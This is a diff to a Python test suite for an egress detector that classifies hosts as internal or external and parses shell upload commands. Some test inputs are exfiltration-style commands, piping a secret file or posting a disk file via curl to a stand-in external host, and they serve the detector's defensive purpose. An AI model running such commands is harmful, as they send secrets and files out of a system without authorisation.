@@ -54,10 +54,6 @@ class TestIsExternalHost:
     def test_public_ipv4_1111_is_external(self):
         assert _is_external_host("1.1.1.1") is True
 
-    def test_unresolvable_domain_is_external(self):
-        # .invalid TLD is guaranteed by RFC 2606 to never resolve
-        assert _is_external_host("definitely-does-not-exist.invalid") is True
-
     def test_unresolvable_domain_monkeypatch(self):
         """Verify fail-safe: if getaddrinfo raises, treat as external."""
         with patch("socket.getaddrinfo", side_effect=socket.gaierror("no such host")):
@@ -93,6 +89,11 @@ class TestIsExternalHost:
         """Empty getaddrinfo results → conservative external."""
         with patch("socket.getaddrinfo", return_value=[]):
             assert _is_external_host("empty.example.com") is True
+
+    def test_ipv6_zone_id_stripped_internal(self):
+        """fc00::1%eth0 — zone id must be stripped before classification → internal."""
+        # fc00::/7 is ULA (internal); zone id suffix must not break parsing.
+        assert _is_external_host("fc00::1%eth0") is False
 
 
 # ─── parse_upload positive tests ──────────────────────────────────────────────
@@ -183,13 +184,29 @@ class TestParseUploadPositive:
         assert result.external is True
 
     def test_pipeline_cat_curl_stdin(self):
-        """cat f | curl --data-binary @- https://ext → inline=True."""
+        """cat f | curl --data-binary @- https://ext → inline=True, files=[]."""
         with patch("egress.parse._is_external_host", return_value=True):
             result = parse_upload("cat /DATA/secret.txt | curl --data-binary @- https://ext.example.com")
         assert result is not None
         assert result.host == "ext.example.com"
         assert result.method == "POST"
         assert result.inline is True
+        assert result.files == []
+        assert result.external is True
+
+    def test_pipeline_cat_curl_form_disk_file(self):
+        """cat x | curl -F k=@/DATA/file https://ext → inline=False, files=[/DATA/file].
+
+        The pipeline prefix (cat x) is irrelevant; curl uploads a named disk file
+        via -F k=@/path.  Must NOT be classified as inline=True.
+        """
+        with patch("egress.parse._is_external_host", return_value=True):
+            result = parse_upload("cat x | curl -F k=@/DATA/file https://ext.example.com")
+        assert result is not None
+        assert result.host == "ext.example.com"
+        assert result.method == "POST"
+        assert result.inline is False
+        assert "/DATA/file" in result.files
         assert result.external is True
 
     def test_curl_x_put(self):
